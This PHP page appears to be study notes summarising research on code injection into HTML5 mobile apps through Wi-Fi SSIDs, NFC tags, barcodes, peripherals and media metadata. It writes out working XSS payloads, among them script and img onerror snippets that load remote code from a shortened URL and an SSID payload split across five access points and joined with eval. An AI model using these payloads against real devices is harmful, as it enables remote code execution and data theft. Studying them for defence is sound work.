<?php $iainPageTitle = 'Mobile App Code Injection'; $docDepth = 2;?>
<?php include '../../partials/head.php'; ?>

<?php $breadcrumbAddress = (ltrim($homePath,'"')) . 'partials/breadcrumbs.php'; ?>
<?php include $breadcrumbAddress; ?>

<p>
	By recieving data from various sources (Bar codes, AR codes, RFID tags, media files, Bluetooth device ID, Wi-Fi access points... ) HTML5 apps become vulnirable to code injection, similar to XSS.
</p>
<p>The javascript runs inside a sandbox implemented by the WebView (UIWebView for iOS, WebBrowser for Windows Phone).  This allows the Javadcript a 'bridge' of sorts that allows the JS to invoke native code and access the device through whatever permissions may be assigned to the app.  The following table shows some of the ways injected code might be triggered:</p>
<img src="triggers.png" />
<p><a href="http://www.cis.syr.edu/~wedu/Research/paper/xds_attack.pdf?utm_source=html5weekly&utm_medium=email">*</a></p>
<p>Access to internal data (contact list, media files...) gives oppertunity for propegation.  There is even the potential to send copies of malicious code through SMS, Bluetooth ID, Media File metadata...</p>
<hr />
<p>Some examples</p>
<ul>
	<li>
		Set the SSID of a Wifi access point to <code>&lt;script&gt;alert('attack')&lt;/script&gt;</code>, now try scanning for Wifi with an HTML5 scanner app.
	</li>
	<li>
		NFC tag, write the Javascript attack into a tag, move the tag near somone's phone - if their screen isn't locked and they have an HTML5 NFC app, there may be an easy rout in.
	</li>
	<li>
		2D bar codes, same as above but passive, they can hold up to 2Kb of data.
	</li>
	<li>
		Periferals, eg: credit card scanner - fake credit card with attack data scanned into an HTML5 credit card app.
	</li>
	<li>
		Mediafile metadata - often displayed in media apps (music players, photo galleries...)
	</li>
	<li>
		FM Radio apps reading RDS (Radio Data System) protocal - an embedded digital stream. 
	</li>
</ul>
<hr />
<h3>Length Limitation</h3>
<p>How much damaging code can be written into the small spaces of these various channels?</p>
<img src="LengthLimitation.png" />
<p><a href="http://www.cis.syr.edu/~wedu/Research/paper/xds_attack.pdf?utm_source=html5weekly&utm_medium=email">*</a></p>
<p>Focusing on the smaller cases: how to bring in external code with the smallest number of characters:<br />
Shorten URLs, eg: <a href="http://tr.im/5kk8t">http://tr.im/5kk8t</a><br />
Drop the 'http:' and '>'<br />
And:
</p>
<ul>
	<li>
		<code>&lt;script src=//tr.im/5kk8t&gt;&lt;/script</code><br />34 characters
	</li>
	<li>
		<code>&lt;img src onerror= d=document; b=d.createElement(’script’); d.body.appendChild(b); b.src=’http://tr.im/5kk8t’&gt;</code> <br />
		105 characters (onerror is called when the undefined src doesn't load)
	</li>
	<li>
		<code>&lt;img src onerror=$.getScript(’http://tr.im/5kk8t’)&gt;</code><br />
		51 characters (if the app runs jQuery)
	</li>
</ul>
<p>To get through the smallest field (SSID) the attacker might set up 5 Wifi spots each displaying one of the following:</p>
<ol>
	<li><code>&lt;img src onerror=a="$.getScr"&gt;</code></li>
	<li><code>&lt;img src onerror=b="ipt(’ht"&gt;</code></li>
	<li><code>&lt;img src onerror=c="tp://mu."&gt;</code></li>
	<li><code>&lt;img src onerror=d="gl’)"&gt;</code></li>
	<li><code>&lt;img src onerror=eval(a+b+c+d)&gt;</code></li>
</ol>
<p>Note - the above example comes from the source in which they owned a shorter domain.</p>
<p>All it needs is to make sure the 5th shows up last.</p>

<hr />
Sources:
<ul>
	<li>
		A fairly in depth <a href="http://www.cis.syr.edu/~wedu/Research/paper/xds_attack.pdf?utm_source=html5weekly&utm_medium=email">study</a>.
	</li>
</ul>
<?php $footerAddress = (ltrim($homePath,'"')) . 'partials/footer.php'; ?>
<?php include $footerAddress; ?>